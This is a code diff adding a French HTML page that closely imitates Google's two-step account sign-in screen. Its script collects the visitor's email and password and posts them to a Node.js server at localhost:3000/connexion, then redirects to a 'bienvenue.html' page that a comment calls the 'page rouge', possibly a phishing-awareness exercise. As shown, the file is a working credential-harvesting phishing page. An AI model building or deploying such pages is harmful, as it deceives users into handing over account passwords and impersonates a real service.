@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Se connecter – Google Comptes</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Google Sans', Roboto, Arial, sans-serif;
+    background: #fff; display: flex; flex-direction: column;
+    min-height: 100vh; color: #202124;
+  }
+  .container {
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    flex: 1; padding: 48px 16px;
+  }
+  .card {
+    width: 100%; max-width: 450px;
+    border: 1px solid #dadce0; border-radius: 8px;
+    padding: 48px 40px 36px; display: none;
+    animation: fadeIn .25s ease;
+  }
+  .card.active { display: block; }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(8px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .logo { display: flex; justify-content: center; margin-bottom: 16px; }
+  h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; color: #202124; }
+  .subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 24px; }
+  .email-chip {
+    display: flex; align-items: center;
+    border: 1px solid #dadce0; border-radius: 24px;
+    padding: 6px 12px; width: fit-content; margin: 0 auto 24px;
+    gap: 8px; cursor: pointer; font-size: 14px; color: #202124;
+    transition: background .15s;
+  }
+  .email-chip:hover { background: #f8f9fa; }
+  .chip-avatar {
+    width: 24px; height: 24px; border-radius: 50%;
+    background: #1a73e8; display: flex; align-items: center;
+    justify-content: center; color: white; font-size: 12px; font-weight: 500;
+  }
+  .field { position: relative; margin-bottom: 24px; }
+  .field input {
+    width: 100%; height: 56px; border: 1px solid #dadce0; border-radius: 4px;
+    padding: 13px 15px; font-size: 16px; color: #202124;
+    outline: none; font-family: inherit; background: transparent; transition: border .2s;
+  }
+  .field input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+  .field input.error { border: 2px solid #d93025 !important; padding: 12px 14px; }
+  .field label {
+    position: absolute; top: 50%; left: 15px;
+    transform: translateY(-50%); font-size: 16px;
+    color: #5f6368; pointer-events: none;
+    transition: all .15s ease; background: white; padding: 0 4px;
+  }
+  .field input:focus ~ label,
+  .field input:not(:placeholder-shown) ~ label { top: 0; font-size: 12px; color: #1a73e8; }
+  .field input.error ~ label { color: #d93025 !important; top: 0; font-size: 12px; }
+  .field input:not(:focus):not(:placeholder-shown):not(.error) ~ label { color: #5f6368; }
+  .field .toggle-pw {
+    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+    background: none; border: none; cursor: pointer;
+    color: #5f6368; font-size: 13px; font-family: inherit; padding: 4px 6px;
+  }
+  .field input[type=password] { padding-right: 80px; }
+  .err-msg { color: #d93025; font-size: 12px; margin-top: -18px; margin-bottom: 16px; }
+  a.link { color: #1a73e8; font-size: 14px; text-decoration: none; }
+  a.link:hover { text-decoration: underline; }
+  .info-text { font-size: 14px; color: #202124; margin-bottom: 24px; line-height: 1.6; }
+  .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 8px; }
+  .btn-next {
+    background: #1a73e8; color: white; border: none; border-radius: 4px;
+    padding: 0 24px; height: 36px; font-size: 14px; font-weight: 500;
+    cursor: pointer; font-family: inherit; letter-spacing: .25px;
+    transition: background .2s, box-shadow .2s;
+  }
+  .btn-next:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(0,0,0,.2); }
+  .btn-next:active { background: #185abc; }
+  footer {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 16px 24px; font-size: 12px; color: #5f6368; flex-wrap: wrap; gap: 8px;
+  }
+  footer select {
+    border: none; color: #5f6368; font-size: 12px;
+    cursor: pointer; font-family: inherit; background: transparent; outline: none;
+  }
+  .footer-links { display: flex; gap: 16px; }
+  .footer-links a { color: #5f6368; text-decoration: none; }
+  .footer-links a:hover { color: #202124; }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- ÉTAPE 1 : Email -->
+  <div class="card active" id="step1">
+    <div class="logo">
+      <svg width="75" height="24" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M18.85 12.2c0-.63-.06-1.25-.16-1.84H9.6v3.49h5.2a4.45 4.45 0 01-1.93 2.92v2.43h3.12c1.83-1.68 2.88-4.16 2.88-7z" fill="#4285F4"/>
+        <path d="M9.6 18.92c2.6 0 4.78-.86 6.37-2.32l-3.12-2.43c-.86.58-1.96.92-3.25.92-2.5 0-4.62-1.69-5.38-3.96H1.02v2.51A9.6 9.6 0 009.6 18.92z" fill="#34A853"/>
+        <path d="M4.22 11.13a5.77 5.77 0 010-3.68V4.94H1.02a9.6 9.6 0 000 8.7l3.2-2.51z" fill="#FBBC05"/>
+        <path d="M9.6 3.48c1.41 0 2.67.49 3.67 1.44l2.75-2.75A9.58 9.58 0 009.6.68 9.6 9.6 0 001.02 4.94l3.2 2.51c.76-2.27 2.88-3.97 5.38-3.97z" fill="#EA4335"/>
+        <text x="22" y="17" font-family="Arial" font-size="14" fill="#202124" letter-spacing="-0.3">Google</text>
+      </svg>
+    </div>
+    <h1>Se connecter</h1>
+    <p class="subtitle">Utiliser votre compte Google</p>
+    <div class="field">
+      <input type="email" id="email" placeholder=" " autocomplete="email"/>
+      <label for="email">Adresse e-mail ou numéro de téléphone</label>
+    </div>
+    <div id="email-err" class="err-msg" style="display:none;">Saisissez une adresse e-mail valide.</div>
+    <div style="margin-bottom:20px;">
+      <a href="#" class="link">Vous avez oublié votre adresse e-mail ?</a>
+    </div>
+    <p class="info-text">
+      Vous n'utilisez pas votre propre ordinateur ? Utilisez la fenêtre de navigation privée.
+      <a href="#" class="link">En savoir plus</a>
+    </p>
+    <div class="actions">
+      <a href="#" class="link" style="font-weight:500;">Créer un compte</a>
+      <button class="btn-next" onclick="goStep2()">Suivant</button>
+    </div>
+  </div>
+
+  <!-- ÉTAPE 2 : Mot de passe -->
+  <div class="card" id="step2">
+    <div class="logo">
+      <svg width="75" height="24" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M18.85 12.2c0-.63-.06-1.25-.16-1.84H9.6v3.49h5.2a4.45 4.45 0 01-1.93 2.92v2.43h3.12c1.83-1.68 2.88-4.16 2.88-7z" fill="#4285F4"/>
+        <path d="M9.6 18.92c2.6 0 4.78-.86 6.37-2.32l-3.12-2.43c-.86.58-1.96.92-3.25.92-2.5 0-4.62-1.69-5.38-3.96H1.02v2.51A9.6 9.6 0 009.6 18.92z" fill="#34A853"/>
+        <path d="M4.22 11.13a5.77 5.77 0 010-3.68V4.94H1.02a9.6 9.6 0 000 8.7l3.2-2.51z" fill="#FBBC05"/>
+        <path d="M9.6 3.48c1.41 0 2.67.49 3.67 1.44l2.75-2.75A9.58 9.58 0 009.6.68 9.6 9.6 0 001.02 4.94l3.2 2.51c.76-2.27 2.88-3.97 5.38-3.97z" fill="#EA4335"/>
+        <text x="22" y="17" font-family="Arial" font-size="14" fill="#202124" letter-spacing="-0.3">Google</text>
+      </svg>
+    </div>
+    <h1 id="welcome-name">Bonjour</h1>
+    <div class="email-chip" onclick="backToStep1()">
+      <div class="chip-avatar" id="chip-initial">U</div>
+      <span id="chip-email">utilisateur@gmail.com</span>
+      <svg width="10" height="10" viewBox="0 0 10 10"><path d="M5 7L1 3h8z" fill="#5f6368"/></svg>
+    </div>
+    <div class="field">
+      <input type="password" id="password" placeholder=" " autocomplete="current-password"/>
+      <label for="password">Saisissez votre mot de passe</label>
+      <button class="toggle-pw" type="button" onclick="togglePw()">Afficher</button>
+    </div>
+    <div id="pw-err" class="err-msg" style="display:none;">Saisissez votre mot de passe.</div>
+    <div style="margin-bottom:20px;">
+      <a href="#" class="link">Mot de passe oublié ?</a>
+    </div>
+    <div class="actions">
+      <a href="#" class="link" style="font-weight:500;">Autres options</a>
+      <button class="btn-next" onclick="doLogin()">Suivant</button>
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <select>
+    <option>Français (France)</option>
+    <option>English (United States)</option>
+    <option>Español</option>
+    <option>Português (Brasil)</option>
+  </select>
+  <div class="footer-links">
+    <a href="#">Aide</a>
+    <a href="#">Confidentialité</a>
+    <a href="#">Conditions d'utilisation</a>
+  </div>
+</footer>
+
+<script>
+  function goStep2() {
+    const emailInput = document.getElementById('email');
+    const val = emailInput.value.trim();
+    const errEl = document.getElementById('email-err');
+    if (!val || (!val.includes('@') && !/^\+?\d{7,}$/.test(val))) {
+      emailInput.classList.add('error');
+      errEl.style.display = 'block';
+      emailInput.focus();
+      return;
+    }
+    emailInput.classList.remove('error');
+    errEl.style.display = 'none';
+    document.getElementById('chip-email').textContent = val;
+    document.getElementById('chip-initial').textContent = val[0].toUpperCase();
+    const name = val.split('@')[0];
+    document.getElementById('welcome-name').textContent =
+      'Bonjour ' + name.charAt(0).toUpperCase() + name.slice(1);
+    document.getElementById('step1').classList.remove('active');
+    document.getElementById('step2').classList.add('active');
+    document.getElementById('password').focus();
+  }
+
+  function backToStep1() {
+    document.getElementById('step2').classList.remove('active');
+    document.getElementById('step1').classList.add('active');
+    document.getElementById('email').focus();
+  }
+
+  function togglePw() {
+    const inp = document.getElementById('password');
+    const btn = document.querySelector('.toggle-pw');
+    if (inp.type === 'password') { inp.type = 'text'; btn.textContent = 'Masquer'; }
+    else { inp.type = 'password'; btn.textContent = 'Afficher'; }
+  }
+
+  async function doLogin() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const pwInput = document.getElementById('password');
+    const errEl = document.getElementById('pw-err');
+
+    if (!password) {
+      pwInput.classList.add('error');
+      errEl.style.display = 'block';
+      pwInput.focus();
+      return;
+    }
+    pwInput.classList.remove('error');
+    errEl.style.display = 'none';
+
+    // Envoyer email + mot de passe au serveur Node.js
+    try {
+      await fetch('http://localhost:3000/connexion', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: email, mot_de_passe: password })
+      });
+    } catch(e) {
+      console.log('Erreur serveur:', e);
+    }
+
+    // Rediriger vers la page rouge
+    window.location.href = 'bienvenue.html';
+  }
+
+  document.addEventListener('keydown', e => {
+    if (e.key !== 'Enter') return;
+    if (document.getElementById('step1').classList.contains('active')) goStep2();
+    else doLogin();
+  });
+</script>
+</body>
+</html>
